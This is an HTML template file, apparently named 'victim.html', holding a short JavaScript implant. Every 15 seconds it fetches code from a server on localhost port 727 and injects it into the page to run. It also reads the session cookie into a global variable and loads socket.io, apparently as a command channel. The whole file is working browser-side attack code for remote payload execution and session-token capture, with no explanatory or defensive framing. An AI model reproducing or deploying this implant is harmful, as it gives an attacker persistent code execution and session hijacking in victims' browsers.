<!-- /templates/victim.html -->

<script>
async function fetchAndRunPayload() {
    try {
        const res = await fetch("http://localhost:727/get_payload"); 
        const payloadCode = await res.text(); 
        const sessionId = document.cookie.split('; ').find(row => row.startsWith('session='))?.split('=')[1];
        window.currentSessionId = sessionId;  

        if (payloadCode) {
            const ioScript = document.createElement("script");
            ioScript.src = "http://localhost:727/static/js/socket.io.min.js"; 
            ioScript.onload = () => {
                const script = document.createElement("script");
                script.type = "text/javascript";
                script.textContent = payloadCode;
                document.body.appendChild(script);
            };
            document.body.appendChild(ioScript);
        }
    } catch(e) {
        console.error("Failed to fetch payload:", e);
    }
}

setInterval(fetchAndRunPayload, 15000);
</script>
